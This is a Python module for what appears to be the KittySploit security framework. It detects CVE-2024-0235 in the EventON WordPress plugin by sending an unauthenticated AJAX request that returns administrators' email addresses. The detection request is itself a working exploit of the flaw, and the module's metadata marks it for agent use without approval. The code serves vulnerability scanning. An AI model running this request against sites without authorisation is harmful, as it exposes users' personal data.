#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""The EventON WordPress plugin before 4."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'EventON (Free < 2.2.8, Premium < 4.5.5) - Information Disclosure Detection',
        'description': 'The EventON WordPress plugin before 4.5.5, EventON WordPress plugin before 2.2.7 do not have authorization in an AJAX action, allowing unauthenticated users to retrieve email addresses of any users on the blog.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2024', 'wp', 'wordpress', 'wp-plugin', 'exposure', 'eventon', 'wpscan', 'myeventon', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://wpscan.com/vulnerability/e370b99a-f485-42bd-96a3-60432a15a4e9/',
            'https://github.com/fkie-cad/nvd-json-data-feeds',
            'https://nvd.nist.gov/vuln/detail/CVE-2024-0235',
        ],
        'cve': 'CVE-2024-0235',
    }

    def run(self):
        path = '/wp-admin/admin-ajax.php?action=eventon_get_virtual_users'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded'}, data='_user_role=administrator')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('@', 'status":"good', 'value=', '"content":',)
        if all(m in body for m in body_all):
            self.set_info(
                severity='medium',
                reason='EventON (Free < 2.2.8, Premium < 4.5.5) - Information Disclosure detected',
                path=path,
            )
            return True
        return False

